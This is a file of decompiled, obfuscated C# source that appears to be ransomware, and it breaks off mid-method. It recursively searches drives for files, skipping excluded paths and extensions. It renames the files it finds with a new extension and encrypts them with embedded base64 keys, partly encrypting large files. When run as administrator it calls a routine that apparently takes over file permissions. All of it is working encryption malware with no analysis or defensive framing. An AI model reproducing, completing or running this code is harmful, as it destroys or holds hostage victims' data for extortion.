using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using PAvKfaIFZl;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using leLftCXICzmTes;

namespace uBrdXrCSgnwM;

internal sealed class hWHDXjXKuyuXQ
{
	public sealed class YhjuApFlyy
	{
		private static StringCollection FQvjqwRntWJOAnBS;

		private static List<string> DwpxzasJgb;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107412840));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if ((!text.ToLower().Contains(getString_0(107412835)) && !text.ToLower().Contains(getString_0(107412846)) && !text.ToLower().Contains(getString_0(107388840)) && !text.ToLower().Contains(getString_0(107388859)) && !text.ToLower().Contains(getString_0(107412801)) && !text.ToLower().Contains(getString_0(107388167)) && !text.ToLower().Contains(getString_0(107388067)) && !text.ToLower().Contains(getString_0(107388082)) && !text.ToLower().Contains(getString_0(107388033)) && !text.ToLower().Contains(getString_0(107388048)) && !text.ToLower().Contains(getString_0(107388526)) && !text.ToLower().Contains(getString_0(107388509)) && !text.ToLower().Contains(getString_0(107388460)) && !text.ToLower().Contains(getString_0(107388447)) && !text.ToLower().Contains(getString_0(107388426)) && !text.ToLower().Contains(getString_0(107388445)) && !text.ToLower().Contains(getString_0(107388432)) && !text.ToLower().Contains(getString_0(107388383)) && !text.ToLower().Contains(getString_0(107388398)) && !text.Contains(XtEtTgUvwHGMW(getString_0(107388381))) && !text.Contains(getString_0(107388324)) && !text.Contains(getString_0(107388343)) && !text.Contains(getString_0(107388298)) && !text.EndsWith(getString_0(107395538)) && !text.EndsWith(getString_0(107388305)) && !text.EndsWith(getString_0(107387756)) && !text.EndsWith(getString_0(107387751)) && !text.EndsWith(getString_0(107387746)) && !text.ToLower().Contains(getString_0(107387773)) && !text.ToLower().Contains(rwyuADDQdblNA)) || text.Contains(XtEtTgUvwHGMW(getString_0(107388108))))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(rqLFEsCDTMyF) * 1024.0 * 1024.0 && oLUeHhoXSrXL == getString_0(107396862))
							{
								DwpxzasJgb.Add(text);
							}
							else if (File.Exists(text) && oLUeHhoXSrXL == getString_0(107396685))
							{
								DwpxzasJgb.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				array3 = array2;
				foreach (string string_ in array3)
				{
					WalkDirectoryTree(string_);
				}
			}
			return DwpxzasJgb;
		}

		static YhjuApFlyy()
		{
			Strings.CreateGetStringDelegate(typeof(YhjuApFlyy));
			FQvjqwRntWJOAnBS = new StringCollection();
			DwpxzasJgb = new List<string>();
		}
	}

	private sealed class PpggCFgBmEOIDGcQN
	{
		public string IpRGqFaYhWFXiZxQ;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == IpRGqFaYhWFXiZxQ;
		}
	}

	private sealed class mBFjfBvsSut
	{
		public string NvCcfrWLFEi;

		public bool _003CIsDriveNTFS_003Eb__1d(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == NvCcfrWLFEi;
		}
	}

	private sealed class NoEnPzbDkfhvS
	{
		private sealed class kTXTIWfGzHEwJ
		{
			public NoEnPzbDkfhvS WKRdeXCxBNOJhHK;

			public string bxBPkBiQPHtaoYm;

			public void _003CCrypt_003Eb__28()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					lSSmXkoNzcQSWj(WindowsIdentity.GetCurrent().Name, bxBPkBiQPHtaoYm);
				}
			}

			public void _003CCrypt_003Eb__29()
			{
				JVXFxJQrKlaBZ(bxBPkBiQPHtaoYm, WKRdeXCxBNOJhHK.mJAooCuEQeBfV, WKRdeXCxBNOJhHK.WHtCQmtmCerFiI, WKRdeXCxBNOJhHK.tcuSYIIomKFQ, WKRdeXCxBNOJhHK.weaWcqsUGynTpn);
			}
		}

		public string[] mJAooCuEQeBfV;

		public string[] tcuSYIIomKFQ;

		public string weaWcqsUGynTpn;

		public string WHtCQmtmCerFiI;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__27(string string_0)
		{
			kTXTIWfGzHEwJ CS_0024_003C_003E8__locals0 = new kTXTIWfGzHEwJ();
			CS_0024_003C_003E8__locals0.WKRdeXCxBNOJhHK = this;
			CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm = string_0;
			if (WRwAKzNShnoL && !KDRBaizPAVVdHDL().Contains(getString_0(107388610)) && !KDRBaizPAVVdHDL().Contains(getString_0(107386723)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						lSSmXkoNzcQSWj(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (mWfsjXfVaDjgsa == getString_0(107396869))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					JVXFxJQrKlaBZ(CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm, CS_0024_003C_003E8__locals0.WKRdeXCxBNOJhHK.mJAooCuEQeBfV, CS_0024_003C_003E8__locals0.WKRdeXCxBNOJhHK.WHtCQmtmCerFiI, CS_0024_003C_003E8__locals0.WKRdeXCxBNOJhHK.tcuSYIIomKFQ, CS_0024_003C_003E8__locals0.WKRdeXCxBNOJhHK.weaWcqsUGynTpn);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				JVXFxJQrKlaBZ(CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm, mJAooCuEQeBfV, WHtCQmtmCerFiI, tcuSYIIomKFQ, weaWcqsUGynTpn);
			}
		}

		static NoEnPzbDkfhvS()
		{
			Strings.CreateGetStringDelegate(typeof(NoEnPzbDkfhvS));
		}
	}

	private sealed class HbGtZiKmUw
	{
		private sealed class QScawntZyyJuoh
		{
			public HbGtZiKmUw tkdfLXnvtaLVtT;

			public string ksJAkzHcZyIN;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__37()
			{
				try
				{
					if (qqVKUcwYqRObMU)
					{
						Console.WriteLine(getString_0(107412348) + ksJAkzHcZyIN + getString_0(107412757) + new FileInfo(ksJAkzHcZyIN).Length + getString_0(107412768));
						Console.WriteLine(getString_0(107412355), lBBLtRfPsPV.Count, DnHtYVwZFeaR, gmdqiJfLiKSG);
						Console.WriteLine(getString_0(107412298), UNPGQjVMpE.Elapsed);
						Console.WriteLine(getString_0(107412727));
					}
				}
				catch
				{
				}
			}

			static QScawntZyyJuoh()
			{
				Strings.CreateGetStringDelegate(typeof(QScawntZyyJuoh));
			}
		}

		private sealed class vljTfCIVJtKHSZF
		{
			public QScawntZyyJuoh wQAMPOiVfhK;

			public HbGtZiKmUw tkdfLXnvtaLVtT;

			public string gJazcLYPjvD;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__38()
			{
				foreach (string item in hHDzREQRrQkqjKe)
				{
					if (gJazcLYPjvD.ToLower().EndsWith(item + tkdfLXnvtaLVtT.UfgTUBLEANxCD) && TQwKQbvIHjGUX == getString_0(107396884))
					{
						if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > new FileInfo(gJazcLYPjvD).Length)
						{
							try
							{
								ySVDzMAbizHUS.FvMtDCdFtDGVbzA(getString_0(107389224), getString_0(107389187), getString_0(107389174), gJazcLYPjvD);
							}
							catch
							{
							}
						}
					}
					else if (gJazcLYPjvD.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396707))
					{
						try
						{
							ySVDzMAbizHUS.FvMtDCdFtDGVbzA(getString_0(107389224), getString_0(107389187), getString_0(107389174), gJazcLYPjvD);
						}
						catch
						{
						}
					}
				}
			}

			static vljTfCIVJtKHSZF()
			{
				Strings.CreateGetStringDelegate(typeof(vljTfCIVJtKHSZF));
			}
		}

		private sealed class HLVtOJtcIkZeWP
		{
			public HbGtZiKmUw tkdfLXnvtaLVtT;

			public string ksJAkzHcZyIN;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__3a()
			{
				try
				{
					if (qqVKUcwYqRObMU)
					{
						Console.WriteLine(getString_0(107412355) + ksJAkzHcZyIN + getString_0(107412764) + new FileInfo(ksJAkzHcZyIN).Length + getString_0(107412775));
						Console.WriteLine(getString_0(107412362), lBBLtRfPsPV.Count, DnHtYVwZFeaR, gmdqiJfLiKSG);
						Console.WriteLine(getString_0(107412305), UNPGQjVMpE.Elapsed);
						Console.WriteLine(getString_0(107412734));
					}
				}
				catch
				{
				}
			}

			public void _003CWorkerCrypter2_003Eb__3b()
			{
				foreach (string item in hHDzREQRrQkqjKe)
				{
					if (ksJAkzHcZyIN.ToLower().EndsWith(item + tkdfLXnvtaLVtT.UfgTUBLEANxCD) && TQwKQbvIHjGUX == getString_0(107396887))
					{
						if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > new FileInfo(ksJAkzHcZyIN).Length)
						{
							try
							{
								ySVDzMAbizHUS.FvMtDCdFtDGVbzA(getString_0(107389227), getString_0(107389190), getString_0(107389177), ksJAkzHcZyIN);
							}
							catch
							{
							}
						}
					}
					else if (ksJAkzHcZyIN.ToLower().EndsWith(item) && TQwKQbvIHjGUX == getString_0(107396710))
					{
						try
						{
							ySVDzMAbizHUS.FvMtDCdFtDGVbzA(getString_0(107389227), getString_0(107389190), getString_0(107389177), ksJAkzHcZyIN);
						}
						catch
						{
						}
					}
				}
			}

			static HLVtOJtcIkZeWP()
			{
				Strings.CreateGetStringDelegate(typeof(HLVtOJtcIkZeWP));
			}
		}

		public List<string> JQuaujjSravKN;

		public List<string> XZRDbtNRlUBUa;

		public string UfgTUBLEANxCD;

		public string[] JzXWXIIovwkoW;

		public string kEFVKbULbQeU;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__36(string string_0)
		{
			using List<string>.Enumerator enumerator = XZRDbtNRlUBUa.GetEnumerator();
			vljTfCIVJtKHSZF CS_0024_003C_003E8__locals0;
			while (enumerator.MoveNext())
			{
				QScawntZyyJuoh CS_0024_003C_003E8__locals1 = new QScawntZyyJuoh();
				CS_0024_003C_003E8__locals1.tkdfLXnvtaLVtT = this;
				CS_0024_003C_003E8__locals1.ksJAkzHcZyIN = enumerator.Current;
				if (((CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388962)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388937)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388904)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388855)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388874)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388817)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388284)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388271)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388290)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388253)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388212)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388227)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388201)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388148))) && !CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(XtEtTgUvwHGMW(getString_0(107388123)))) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388082)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388097)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388048)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388063)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388526)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388541)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388524)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388475)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388462)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388441)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388460)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388447)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388398)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.ToLower().Contains(getString_0(107388413)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(XtEtTgUvwHGMW(getString_0(107388396))) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388339)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388358)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107396381)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107388313)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(UfgTUBLEANxCD) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(getString_0(107388320)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(getString_0(107387771)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(getString_0(107387766)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(getString_0(107387761)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(getString_0(107387788)) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(rwyuADDQdblNA) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(LImNkSPhwOOQHW) || CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.Contains(mqQgvSYgrlnpSvAge))
				{
					continue;
				}
				if (JzXWXIIovwkoW.Length != 0)
				{
					string[] jzXWXIIovwkoW = JzXWXIIovwkoW;
					int num = 0;
					while (num < jzXWXIIovwkoW.Length)
					{
						string value = jzXWXIIovwkoW[num];
						if (!CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_10d8;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(UfgTUBLEANxCD))
					{
						goto IL_10d8;
					}
				}
				catch (Exception)
				{
					goto IL_10d8;
				}
				if (!CS_0024_003C_003E8__locals1.ksJAkzHcZyIN.EndsWith(string_0) || lBBLtRfPsPV.Contains(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN))
				{
					continue;
				}
				if (mdbUrlsnzSwt == getString_0(107396877))
				{
					try
					{
						if (dHuTNVWgMqhChXsi.uwHkPSlbEdqzd(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN))
						{
							dHuTNVWgMqhChXsi.YaBImKBJBjtLtc(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
						}
					}
					catch
					{
					}
				}
				lBBLtRfPsPV.Add(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (qqVKUcwYqRObMU)
						{
							Console.WriteLine(QScawntZyyJuoh.getString_0(107412348) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + QScawntZyyJuoh.getString_0(107412757) + new FileInfo(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN).Length + QScawntZyyJuoh.getString_0(107412768));
							Console.WriteLine(QScawntZyyJuoh.getString_0(107412355), lBBLtRfPsPV.Count, DnHtYVwZFeaR, gmdqiJfLiKSG);
							Console.WriteLine(QScawntZyyJuoh.getString_0(107412298), UNPGQjVMpE.Elapsed);
							Console.WriteLine(QScawntZyyJuoh.getString_0(107412727));
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!rEUVMKgscr.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN)))
				{
					rEUVMKgscr.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN));
				}
				BHcaTUPjYtf(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
				try
				{
					new dfEMPHnLgeI().KIkInStTZGC(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (qqVKUcwYqRObMU)
							{
								Console.WriteLine(getString_0(107412831) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + getString_0(107412754) + new FileInfo(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN).Length + getString_0(107412765));
								Console.WriteLine(getString_0(107412724));
							}
						}
						catch
						{
						}
						spDXxUcNpZnQ(XtEtTgUvwHGMW(getString_0(107412651)), getString_0(107387672) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + getString_0(107387672) + XtEtTgUvwHGMW(getString_0(107413106)) + getString_0(107387672) + Environment.UserName + getString_0(107387672) + XtEtTgUvwHGMW(getString_0(107413121)));
					}
				}
				catch (Exception ex2)
				{
					if (hIFJbdEMJudY)
					{
						try
						{
							File.AppendAllText(LImNkSPhwOOQHW, getString_0(107387444) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + getString_0(107413096) + ex2.Message + getString_0(107395828));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (hIFJbdEMJudY)
						{
							try
							{
								File.AppendAllText(LImNkSPhwOOQHW, getString_0(107387444) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + getString_0(107412983) + ex2.Message + getString_0(107395828));
							}
							catch (Exception)
							{
							}
						}
						gmdqiJfLiKSG++;
						goto end_IL_08d1;
					}
					byte[] bytes;
					if (ZTtOBFIFhDPJ == getString_0(107396877) && new FileInfo(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN).Length > Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024 && !JQuaujjSravKN.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new vljTfCIVJtKHSZF();
						CS_0024_003C_003E8__locals0.wQAMPOiVfhK = CS_0024_003C_003E8__locals1;
						CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT = this;
						try
						{
							if (UfgTUBLEANxCD != getString_0(107386677))
							{
								if (eSjMTjCatON)
								{
									UfgTUBLEANxCD = BBDxmQurRdVswG + UfgTUBLEANxCD;
								}
								File.Move(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + UfgTUBLEANxCD);
							}
						}
						catch (Exception ex2)
						{
							if (hIFJbdEMJudY)
							{
								try
								{
									File.AppendAllText(LImNkSPhwOOQHW, getString_0(107387444) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + getString_0(107412922) + ex2.Message + getString_0(107395828));
								}
								catch (Exception)
								{
								}
							}
							gmdqiJfLiKSG++;
							goto end_IL_08d1;
						}
						CS_0024_003C_003E8__locals0.gJazcLYPjvD = getString_0(107389104);
						if (UfgTUBLEANxCD != getString_0(107386677))
						{
							CS_0024_003C_003E8__locals0.gJazcLYPjvD = CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + UfgTUBLEANxCD;
						}
						else
						{
							CS_0024_003C_003E8__locals0.gJazcLYPjvD = CS_0024_003C_003E8__locals1.ksJAkzHcZyIN;
						}
						if (CMdYdSoRLCrMajhb == getString_0(107396877))
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in hHDzREQRrQkqjKe)
								{
									if (CS_0024_003C_003E8__locals0.gJazcLYPjvD.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT.UfgTUBLEANxCD) && TQwKQbvIHjGUX == vljTfCIVJtKHSZF.getString_0(107396884))
									{
										if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.gJazcLYPjvD).Length)
										{
											try
											{
												ySVDzMAbizHUS.FvMtDCdFtDGVbzA(vljTfCIVJtKHSZF.getString_0(107389224), vljTfCIVJtKHSZF.getString_0(107389187), vljTfCIVJtKHSZF.getString_0(107389174), CS_0024_003C_003E8__locals0.gJazcLYPjvD);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.gJazcLYPjvD.ToLower().EndsWith(item) && TQwKQbvIHjGUX == vljTfCIVJtKHSZF.getString_0(107396707))
									{
										try
										{
											ySVDzMAbizHUS.FvMtDCdFtDGVbzA(vljTfCIVJtKHSZF.getString_0(107389224), vljTfCIVJtKHSZF.getString_0(107389187), vljTfCIVJtKHSZF.getString_0(107389174), CS_0024_003C_003E8__locals0.gJazcLYPjvD);
										}
										catch
										{
										}
									}
								}
							});
							thread2.Priority = ThreadPriority.Normal;
							thread2.IsBackground = false;
							thread2.Start();
						}
						bytes = Encoding.ASCII.GetBytes(jdzEbvPutazU);
						if (iHEcKVZxNihtAo == getString_0(107396700))
						{
							byte[] array = null;
							byte[] byte_ = zuVeojPvzZvsAuYXeg.eiVZeDjgvjzXx(CS_0024_003C_003E8__locals0.gJazcLYPjvD, Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024);
							if (zuVeojPvzZvsAuYXeg.efnMlvSzfC(RJbBOzKoWoPeh: (!OIyyeuNoRzhHTwe) ? (MFCrMNyVwftIF ? zuVeojPvzZvsAuYXeg.rhGTroEfaFqc(byte_, Convert.FromBase64String(kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : zuVeojPvzZvsAuYXeg.rhGTroEfaFqc(byte_, Convert.FromBase64String(kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (MFCrMNyVwftIF ? GGGzGnJbALqDB.ofyMhRiGkVjut(byte_, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu)) : GGGzGnJbALqDB.ofyMhRiGkVjut(byte_, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu))), CijILhJAqDGY: CS_0024_003C_003E8__locals0.gJazcLYPjvD, opeYgyFjaEFL: bytes))
							{
								goto IL_10d8;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + UfgTUBLEANxCD, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
							}
							catch (Exception)
							{
							}
						}
						else if (!MFCrMNyVwftIF)
						{
							if (WngNyaOwcSGdLP.MaLriMjWjsJEaP(CS_0024_003C_003E8__locals0.gJazcLYPjvD, ybUSgcGwjKebC, kEFVKbULbQeU, null, Convert.FromBase64String(HZePHYGbpexu)))
							{
								goto IL_10d8;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + UfgTUBLEANxCD, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (WngNyaOwcSGdLP.MaLriMjWjsJEaP(CS_0024_003C_003E8__locals0.gJazcLYPjvD, ybUSgcGwjKebC, kEFVKbULbQeU, bytes, Convert.FromBase64String(HZePHYGbpexu)))
							{
								goto IL_10d8;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + UfgTUBLEANxCD, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (eSjMTjCatON)
					{
						UfgTUBLEANxCD = BBDxmQurRdVswG + UfgTUBLEANxCD;
					}
					bytes = Encoding.ASCII.GetBytes(jdzEbvPutazU);
					if (UfgTUBLEANxCD != getString_0(107386677))
					{
						if (!wRVzxmISkhBzKR)
						{
							if (!MFCrMNyVwftIF)
							{
								edWBraEVjZnwU(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + UfgTUBLEANxCD, cjnjoiIOwY);
							}
							else
							{
								edWBraEVjZnwU(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + UfgTUBLEANxCD, Convert.FromBase64String(kEFVKbULbQeU));
							}
						}
						else
						{
							try
							{
								if (!MFCrMNyVwftIF)
								{
									yWogjCIsHMw(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + UfgTUBLEANxCD, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
								}
								else
								{
									yWogjCIsHMw(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + UfgTUBLEANxCD, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
								}
							}
							catch (Exception ex2)
							{
								if (hIFJbdEMJudY)
								{
									try
									{
										File.AppendAllText(LImNkSPhwOOQHW, getString_0(107387444) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + getString_0(107386695) + ex2.Message + getString_0(107395828));
									}
									catch (Exception)
									{
									}
								}
								gmdqiJfLiKSG++;
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + UfgTUBLEANxCD, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
								}
								catch (Exception)
								{
								}
								goto end_IL_08d1;
							}
						}
					}
					else if (!wRVzxmISkhBzKR)
					{
						if (!MFCrMNyVwftIF)
						{
							edWBraEVjZnwU(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + getString_0(107386672), cjnjoiIOwY);
						}
						else
						{
							edWBraEVjZnwU(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + getString_0(107386672), Convert.FromBase64String(kEFVKbULbQeU));
						}
					}
					else
					{
						try
						{
							if (!MFCrMNyVwftIF)
							{
								yWogjCIsHMw(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
							}
							else
							{
								yWogjCIsHMw(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, Convert.FromBase64String(kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
							}
						}
						catch (Exception ex2)
						{
							if (hIFJbdEMJudY)
							{
								try
								{
									File.AppendAllText(LImNkSPhwOOQHW, getString_0(107387444) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + getString_0(107386695) + ex2.Message + getString_0(107395828));
								}
								catch (Exception)
								{
								}
							}
							gmdqiJfLiKSG++;
							goto end_IL_08d1;
						}
					}
					if (MFCrMNyVwftIF)
					{
						if (UfgTUBLEANxCD != getString_0(107386677))
						{
							oQVgdpANcfhNxO(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + UfgTUBLEANxCD, bytes);
						}
						else
						{
							oQVgdpANcfhNxO(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, bytes);
						}
					}
					goto IL_10d8;
					end_IL_08d1:;
				}
				catch (Exception)
				{
					goto IL_10d8;
				}
				continue;
				IL_10d8:
				XZRDbtNRlUBUa.Remove(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
			}
		}

		public void _003CWorkerCrypter2_003Eb__39(string string_0)
		{
			HLVtOJtcIkZeWP CS_0024_003C_003E8__locals0 = new HLVtOJtcIkZeWP();
			CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT = this;
			CS_0024_003C_003E8__locals0.ksJAkzHcZyIN = string_0;
